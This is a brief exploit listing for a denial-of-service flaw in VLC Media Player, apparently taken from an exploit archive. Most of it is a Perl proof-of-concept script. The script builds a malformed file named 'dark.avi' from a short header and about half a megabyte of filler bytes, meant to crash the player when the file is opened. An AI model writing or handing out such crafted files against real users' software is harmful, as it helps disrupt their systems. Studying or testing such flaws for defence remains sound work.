source: http://www.securityfocus.com/bid/54208/info

VLC Media Player is prone to a denial-of-service vulnerability.

Successful exploits may allow attackers to crash the affected application, denying service to legitimate users. 

#!/usr/bin/perl
my $h ="\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
my $d = "\x41" x 500429 ;


my $file = "dark.avi";

open ($File, ">$file");
print $File $h,$d;
close ($File);
